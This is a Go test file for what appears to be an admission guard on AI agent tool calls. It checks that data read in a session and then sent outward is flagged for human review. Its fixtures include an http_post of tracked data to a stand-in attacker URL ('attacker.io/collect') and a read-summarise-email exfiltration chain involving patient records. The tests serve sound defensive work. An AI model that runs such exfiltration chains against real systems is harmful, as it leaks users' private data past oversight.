package validator

import (
	"context"
	"testing"

	"github.com/Droshow/PerchGuard/perchguard/pkg/admission"
	"github.com/Droshow/PerchGuard/perchguard/pkg/store"
)

// makeReq is a minimal admission request builder for lineage tests.
func makeReq(sessionID, uid, toolName string, dataRefsIn []string, destURL string) *admission.ToolCallAdmissionRequest {
	return &admission.ToolCallAdmissionRequest{
		UID:        uid,
		SessionID:  sessionID,
		DataRefsIn: dataRefsIn,
		ToolCall: admission.ToolCall{
			Name:           toolName,
			DestinationURL: destURL,
		},
	}
}

func TestLineageValidator_NoDataRefsIn_NoViolation(t *testing.T) {
	ls := store.NewLineageStore()
	v := NewLineageValidator(ls)

	req := makeReq("s1", "uid-1", "read_file", nil, "")
	viol := v.Validate(context.Background(), req)
	if viol != nil {
		t.Errorf("want nil violation, got %+v", viol)
	}
	// Edge should still be recorded so future calls can reference this output.
	outRef := store.LineageRef("s1", "uid-1")
	if g := ls.Graph("s1"); g == nil || !g.HasAny([]string{outRef}) {
		t.Error("expected outRef to be recorded in graph even with empty DataRefsIn")
	}
}

func TestLineageValidator_UntrackedRefsNoViolation(t *testing.T) {
	ls := store.NewLineageStore()
	v := NewLineageValidator(ls)

	// Claim consumption of a ref that was never produced by a governed call.
	req := makeReq("s1", "uid-2", "send_email", []string{"deadbeef"}, "smtp.example.com")
	viol := v.Validate(context.Background(), req)
	if viol != nil {
		t.Errorf("want nil for untracked ref — not in graph, got %+v", viol)
	}
}

func TestLineageValidator_TrackedRef_NoExternalDest_NoViolation(t *testing.T) {
	ls := store.NewLineageStore()
	v := NewLineageValidator(ls)

	// First call: produce a tracked ref.
	v.Validate(context.Background(), makeReq("s1", "uid-1", "read_file", nil, ""))
	ref1 := store.LineageRef("s1", "uid-1")

	// Second call: consume the ref, but no external destination — summarise is internal.
	req := makeReq("s1", "uid-2", "summarise", []string{ref1}, "")
	viol := v.Validate(context.Background(), req)
	if viol != nil {
		t.Errorf("want nil: tracked ref consumed internally, got %+v", viol)
	}
}

func TestLineageValidator_TrackedRef_DestinationURL_HumanReview(t *testing.T) {
	ls := store.NewLineageStore()
	v := NewLineageValidator(ls)

	v.Validate(context.Background(), makeReq("s1", "uid-1", "read_file", nil, ""))
	ref1 := store.LineageRef("s1", "uid-1")

	req := makeReq("s1", "uid-2", "http_post", []string{ref1}, "https://attacker.io/collect")
	viol := v.Validate(context.Background(), req)
	if viol == nil {
		t.Fatal("want HUMAN_REVIEW violation for tracked ref → external URL, got nil")
	}
	if viol.Decision != admission.DecisionHumanReview {
		t.Errorf("want HUMAN_REVIEW, got %s", viol.Decision)
	}
	if viol.Policy != "lineage.crossBoundaryFlow" {
		t.Errorf("want policy lineage.crossBoundaryFlow, got %s", viol.Policy)
	}
}

func TestLineageValidator_TrackedRef_ExternalToolName_HumanReview(t *testing.T) {
	ls := store.NewLineageStore()
	v := NewLineageValidator(ls)

	v.Validate(context.Background(), makeReq("s1", "uid-1", "get_patient_record", nil, ""))
	ref1 := store.LineageRef("s1", "uid-1")

	req := makeReq("s1", "uid-2", "send_email", []string{ref1}, "")
	viol := v.Validate(context.Background(), req)
	if viol == nil {
		t.Fatal("want HUMAN_REVIEW for tracked ref sent via send_email, got nil")
	}
	if viol.Decision != admission.DecisionHumanReview {
		t.Errorf("want HUMAN_REVIEW, got %s", viol.Decision)
	}
}

// TestLineageValidator_ReadSummariseEmailChain is the end-to-end scenario from the
// Cap 2 goal statement: three individually clean calls that form an exfiltration chain.
//
//	Call 1: read_file        → produces ref1 (ALLOW — no external dest, no refs in)
//	Call 2: summarise        → consumes ref1, produces ref2 (ALLOW — no external dest)
//	Call 3: send_email       → consumes ref2 (HUMAN_REVIEW — tracked data to external dest)
func TestLineageValidator_ReadSummariseEmailChain(t *testing.T) {
	ls := store.NewLineageStore()
	v := NewLineageValidator(ls)

	// Call 1: read file — no violation expected.
	v1 := v.Validate(context.Background(), makeReq("sess", "call-1", "read_file", nil, ""))
	if v1 != nil {
		t.Fatalf("call 1 (read_file): want nil, got %+v", v1)
	}
	ref1 := store.LineageRef("sess", "call-1")

	// Call 2: summarise consumes ref1 — no external destination, no violation.
	v2 := v.Validate(context.Background(), makeReq("sess", "call-2", "summarise", []string{ref1}, ""))
	if v2 != nil {
		t.Fatalf("call 2 (summarise): want nil, got %+v", v2)
	}
	ref2 := store.LineageRef("sess", "call-2")

	// Call 3: email the summary — ref2 is tracked, send_email is external. Must fire.
	v3 := v.Validate(context.Background(), makeReq("sess", "call-3", "send_email", []string{ref2}, ""))
	if v3 == nil {
		t.Fatal("call 3 (send_email): want HUMAN_REVIEW violation, got nil")
	}
	if v3.Decision != admission.DecisionHumanReview {
		t.Errorf("call 3: want HUMAN_REVIEW, got %s", v3.Decision)
	}
}

func TestLineageValidator_SessionIsolation(t *testing.T) {
	ls := store.NewLineageStore()
	v := NewLineageValidator(ls)

	// Produce a ref in session A.
	v.Validate(context.Background(), makeReq("sess-A", "uid-1", "read_file", nil, ""))
	refA := store.LineageRef("sess-A", "uid-1")

	// Session B tries to consume session A's ref — graph for B doesn't know refA.
	req := makeReq("sess-B", "uid-2", "send_email", []string{refA}, "")
	viol := v.Validate(context.Background(), req)
	if viol != nil {
		t.Error("session B must not see session A's lineage refs — graphs are isolated")
	}
}
